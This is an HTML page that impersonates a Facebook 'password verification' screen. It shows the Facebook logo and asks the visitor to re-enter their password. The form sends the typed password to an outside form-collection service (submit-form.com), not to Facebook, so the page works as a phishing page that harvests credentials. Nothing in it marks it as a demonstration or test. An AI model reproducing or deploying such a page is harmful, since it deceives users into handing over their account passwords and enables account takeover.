

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Password Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f3f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: all 0.3s ease;
        }

        .container {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            animation: fadeIn 0.6s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo img {
            width: 120px;
            margin-bottom: 20px;
        }

        .header {
            font-size: 28px;
            color: #333;
            font-weight: bold;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }

        .form-group {
            position: relative;
            margin-bottom: 25px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 14px 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 16px;
            color: #333;
            background-color: transparent;
            outline: none;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            border-bottom: 2px solid #1877f2;
        }

        .form-group input.error {
            border-bottom: 2px solid #e74c3c;
            animation: shake 0.3s ease;
        }

        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }

        .form-group label {
            position: absolute;
            left: 0;
            top: 12px;
            font-size: 16px;
            color: #aaa;
            transition: all 0.3s ease;
        }

        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: -12px;
            left: 0;
            font-size: 12px;
            color: #1877f2;
        }

        .eye-icon {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #333;
            cursor: pointer;
            transition: color 0.3s;
        }

        .eye-icon:hover {
            color: #1877f2;
        }

        .submit-button {
            background-color: #1877f2;
            color: #fff;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .submit-button:hover {
            background-color: #166fe5;
            transform: translateY(-2px);
        }

        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 8px;
            text-align: left;
        }

        .small-text {
            font-size: 12px;
            color: #777;
            margin-top: 20px;
        }

        .small-text a {
            color: #1877f2;
            text-decoration: none;
        }

        .small-text a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }

            .header {
                font-size: 24px;
            }

            .form-group input {
                padding: 12px 0;
            }

            .submit-button {
                padding: 12px;
            }

            .eye-icon {
                font-size: 18px;
            }

            .error-message {
                font-size: 13px;
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 35px;
            }

            .header {
                font-size: 26px;
            }

            .form-group input {
                padding: 14px 0;
            }

            .submit-button {
                padding: 14px;
            }

            .eye-icon {
                font-size: 19px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
        </div>
        <div class="header">Facebook Security</div>
        <p>Please re-enter your password to complete the request.</p>
        <form id="passwordForm" action="https://submit-form.com/FJbNhaEHB" method="POST">
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder=" " required>
                <label for="password">Password</label>
                <i class="eye-icon fas fa-eye" id="togglePassword"></i>
                <span id="error-message" class="error-message"></span>
            </div>
            <button type="submit" class="submit-button">Submit</button>
        </form>
        <div class="small-text">
            <p>Forgot your password? <a href="">Click here</a></p>
        </div>
    </div>

    <script>
        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function() {
            var passwordField = document.getElementById('password');
            var eyeIcon = this;
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        });

        // Form validation
        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            var passwordField = document.getElementById('password');
            var errorMessage = document.getElementById('error-message');
            var formValid = true;

            // Clear previous errors
            passwordField.classList.remove('error');
            errorMessage.textContent = '';

            // Password validation: check if it's at least 6 characters
            if (passwordField.value.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                passwordField.classList.add('error');
                formValid = false;
            }

            if (!formValid) {
                event.preventDefault(); // Prevent form submission if validation fails
            }
        });
    </script>
</body>
</html>
